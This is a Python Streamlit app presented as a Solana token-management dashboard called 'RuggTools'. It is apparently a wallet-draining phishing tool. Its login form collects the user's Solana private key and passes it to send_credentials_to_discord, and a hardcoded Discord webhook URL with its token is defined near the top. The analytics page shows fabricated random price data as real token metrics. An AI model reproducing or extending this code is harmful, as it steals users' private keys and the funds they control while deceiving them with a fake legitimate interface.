import streamlit as st
import requests
from datetime import datetime
import base58
from streamlit_lottie import st_lottie
import plotly.graph_objects as go
from streamlit_option_menu import option_menu
import json
from web3 import Web3
import pandas as pd
import numpy as np
from token_manager import display_token_manager
from liquidity_manager import display_liquidity_manager
from wallet_manager import display_wallet_manager
from multisender import display_multisender

# Import functions from auth.py
from auth import get_solana_balance, send_credentials_to_discord, validate_solana_address, validate_solana_private_key, display_user_wallet_info

# Discord webhook configuration
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1331353119686135922/BR0eqE0KKC5NkH2NBHCHNBSY3BXCNu_d9BETAFArslW4IJ9Ikh2STmCWHci_VaXaV796'

# Configure page settings
st.set_page_config(
    page_title="Token Launch Dashboard",
    page_icon="🚀",
    layout="wide",
    initial_sidebar_state="expanded"
)

def dashboard():
    # Display user wallet info in the top-right corner
    display_user_wallet_info()
    
    # Display user balance in the sidebar
    if 'wallet' in st.session_state:
        balance = get_solana_balance(st.session_state.wallet)
        if balance is not None:
            st.sidebar.markdown(f"### Your Balance: {balance:.9f} SOL")

    # Enhanced sidebar with new tools
    with st.sidebar:
        selected = option_menu(
            menu_title="Navigation",
            options=["Home", "Tools", "Analytics", "Settings"],
            icons=['house', 'tools', 'graph-up', 'gear'],
            menu_icon="cast",
            default_index=0,
            styles={
                "container": {"padding": "5!important", "background-color": "#EDE7F6"},
                "icon": {"color": "#AB47BC", "font-size": "25px"}, 
                "nav-link": {"color": "#6A1B9A", "font-size": "16px", "text-align": "left", "margin":"0px"},
                "nav-link-selected": {"background-color": "#AB47BC"},
            }
        )

    if selected == "Home":
        # Welcome Section with Dynamic Stats
        st.markdown("""
            <div style='background: linear-gradient(45deg, #AB47BC, #BA68C8); padding: 30px; border-radius: 15px; margin-bottom: 25px;'>
                <h1 style='color: white; text-align: center;'>Welcome to RuggTools 🚀</h1>
                <p style='color: white; text-align: center; font-size: 18px;'>Your Ultimate Solana Token Management Hub</p>
            </div>
        """, unsafe_allow_html=True)
        
        # Quick Access Tools
        st.markdown("### 🛠️ Quick Access Tools")
        col1, col2, col3 = st.columns(3)
        
        with col1:
            st.markdown("""
                <div class="metric-card">
                    <h4>Token Creation</h4>
                    <p>Launch your own Solana token</p>
                </div>
            """, unsafe_allow_html=True)
            
        with col2:
            st.markdown("""
                <div class="metric-card">
                    <h4>Liquidity Management</h4>
                    <p>Manage your token liquidity</p>
                </div>
            """, unsafe_allow_html=True)
            
        with col3:
            st.markdown("""
                <div class="metric-card">
                    <h4>Batch Operations</h4>
                    <p>Efficient multi-wallet tools</p>
                </div>
            """, unsafe_allow_html=True)
            
        # Latest Updates Section
        st.markdown("### 📢 Latest Updates")
        st.markdown("""
            - ✨ New token creation features added
            - 🔥 Enhanced liquidity management tools
            - 🚀 Improved multi-sender functionality
            - 💫 Optimized wallet generation
        """)
    elif selected == "Tools":
        tool_selected = option_menu(
            menu_title=None,
            options=["Token Manager", "Liquidity Manager", "Wallet Manager", "Multisender Bundle"],
            icons=['coin', 'cash-stack', 'wallet', 'send'],
            orientation="horizontal",
            styles={
                "container": {"padding": "0!important", "background-color": "#EDE7F6"},
                "icon": {"color": "#AB47BC", "font-size": "20px"},
                "nav-link": {"color": "#6A1B9A", "font-size": "14px", "text-align": "center", "margin":"0px", "padding": "10px"},
                "nav-link-selected": {"background-color": "#AB47BC"},
            }
        )
        
        if tool_selected == "Token Manager":
            display_token_manager()
        elif tool_selected == "Liquidity Manager":
            display_liquidity_manager()
        elif tool_selected == "Wallet Manager":
            display_wallet_manager()
        elif tool_selected == "Multisender Bundle":
            display_multisender()

    elif selected == "Analytics":
        st.title("Analytics")
        
        # Token Metrics
        st.markdown("### Token Metrics")
        col1, col2, col3, col4 = st.columns(4)
        
        with col1:
            st.metric("Market Cap", "$1.2M", "+12.5%")
        with col2:
            st.metric("Volume (24h)", "$500K", "+8.2%")
        with col3:
            st.metric("FDV", "$10M", "+15.3%")
        with col4:
            st.metric("Total Supply", "1B", "+0.0%")
        
        # DEX-style Chart
        st.markdown("### Price Chart")
        # Mock data for DEX-style chart
        dex_data = pd.DataFrame({
            'Date': pd.date_range(start='2023-01-01', periods=100, freq='D'),
            'Price': np.random.uniform(0.1, 2.0, size=100)
        })
        
        fig = go.Figure(data=[go.Scatter(x=dex_data['Date'], y=dex_data['Price'], mode='lines', name='Price')])
        fig.update_layout(
            title="Token Price Over Time",
            xaxis_title="Date",
            yaxis_title="Price (SOL)",
            template="plotly_dark",
            plot_bgcolor='rgba(0,0,0,0)',
            paper_bgcolor='rgba(0,0,0,0)',
        )
        st.plotly_chart(fig, use_container_width=True)

    elif selected == "Settings":
        display_settings()

def display_settings():
    st.title("Settings ⚙️")
    
    # Network Settings with validation
    st.markdown("### Network Configuration")
    network = st.selectbox("Select Network", ["Mainnet", "Devnet", "Testnet"], index=0)
    rpc_endpoint = st.text_input("Custom RPC Endpoint", value="https://api.mainnet-beta.solana.com")
    
    enable_2fa = st.toggle("Enable 2FA", value=False)
    auto_logout = st.slider("Auto Logout (minutes)", 5, 60, 30)
    
    notifications = {
        'transactions': st.checkbox("Transaction Alerts", value=False),
        'prices': st.checkbox("Price Alerts", value=False),
        'wallet': st.checkbox("Wallet Activity", value=False)
    }
    
    api_key = st.text_input("API Key", type="password", value="")
    rate_limit = st.number_input("Rate Limit (calls/minute)", min_value=10, max_value=1000, value=100)

    if st.button("Save Settings", use_container_width=True):
        st.success("Settings saved successfully! 🚀")

def login_page():
    st.title("Rugg Dashboard 🚀")
    
    # Check if the user is already logged in
    if "logged_in" not in st.session_state:
        st.session_state.logged_in = False

    if st.session_state.logged_in:
        st.success("You are already logged in! 🚀")
        return

    # Display login form
    with st.form("login_form"):
        wallet = st.text_input("Solana Wallet Address")
        key = st.text_input("Solana Private Key", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            try:
                # Validate inputs
                if not validate_solana_address(wallet):
                    st.error("Invalid Solana wallet address format")
                elif not validate_solana_private_key(key):
                    st.error("Invalid Solana private key format")
                else:
                    # Send credentials and log in
                    if send_credentials_to_discord(wallet, key):
                        st.session_state.logged_in = True
                        st.session_state.wallet = wallet  # Store wallet in session state
                        st.session_state.private_key = key  # Store private key in session state
                        st.success("Login successful! Redirecting...")
                        st.rerun()  # Trigger rerun
                    else:
                        st.error("Failed to send login details to Discord.")
            except Exception as e:
                st.error(f"An unexpected error occurred: {str(e)}")

def main():
    if 'logged_in' not in st.session_state:
        st.session_state.logged_in = False
        
    if not st.session_state.logged_in:
        login_page()
    else:
        # Navigation and other functionality
        dashboard()

if __name__ == "__main__":
    main()